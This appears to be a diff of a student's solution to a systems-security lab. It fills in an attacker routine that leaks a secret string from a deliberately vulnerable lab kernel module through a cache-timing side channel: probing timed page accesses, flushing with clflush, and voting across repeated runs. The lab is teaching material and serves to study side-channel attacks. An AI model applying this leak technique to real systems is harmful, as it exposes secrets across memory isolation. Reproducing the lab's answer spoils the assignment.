@@ -8,7 +8,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
-
+#include <string.h>
 #include "lab2.h"
 #include "lab2ipc.h"
 
@@ -30,33 +30,75 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
+int* getRandom(int* array) {
+	for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
+		array[i] = i;
+	}
+
+	for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++) {
+		int temp = array[i];
+		int r = rand() % LAB2_SHARED_MEMORY_NUM_PAGES;
+
+		array[i] = array[r];
+		array[r] = temp;
+	}
+	return array;
+}
 /*
  * run_attacker
  *
  * Arguments:
  *  - kernel_fd: A file descriptor referring to the lab 2 vulnerable kernel module
- *  - shared_memory: A pointer to a region of memory shared with the server
+ *  - shared_memory: A pointer to a region of memory sharedwith the server
  */
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
+    char check[NUM_ITERATIONS][LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    int array[LAB2_SHARED_MEMORY_NUM_PAGES];
 
+    int *rand = getRandom(array);
     printf("Launching attacker\n");
-
-    for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
-
-        // [Part 1]- Fill this in!
-        // Feel free to create helper methods as necessary.
-        // Use "call_kernel_part1" to interact with the kernel module
-        // Find the value of leaked_byte for offset "current_offset"
-        // leaked_byte = ??
-
-        leaked_str[current_offset] = leaked_byte;
-        if (leaked_byte == '\x00') {
-            break;
-        }
+    for (int x = 0; x < NUM_ITERATIONS; x++) {
+    	for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
+        	char leaked_byte;
+		call_kernel_part1(kernel_fd, shared_memory, current_offset);
+        
+		for (int i = 0; i < LAB2_SHARED_MEMORY_NUM_PAGES; i++ ) {
+	      		int help = rand[i];
+	      		if (time_access(&shared_memory[4096*help]) < THRESHOLD) {
+	       			leaked_byte = help;
+	       			clflush(&shared_memory[4096*help]);
+	       			break;
+	       		}
+	      		else { 
+	      			clflush(&shared_memory[4096*help]);
+	      		}
+		}
+ 					
+        	leaked_str[current_offset] = leaked_byte;
+        	if (leaked_byte == '\x00') {
+            		break;
+        	}
+    	}
+    sprintf(check[x], "%s", leaked_str);
+    printf("String %d is %s\n",x, check[x]);
+    clflush(&check[x]);
     }
+    int fincount = 0;
+    for (int i = 0; i < NUM_ITERATIONS; i++) {
+	    int count = 0;
+	    for (int j = i+1; j < NUM_ITERATIONS; j++) {
+		    if (strcmp(check[i], check[j]) == 0) {
+				    count++;
+		    }
+	    }
+	    if (count > fincount) {
+		    fincount = count;
+		    sprintf(leaked_str, "%s", check[i]);
+	    }
+    }
+
 
     printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);
 
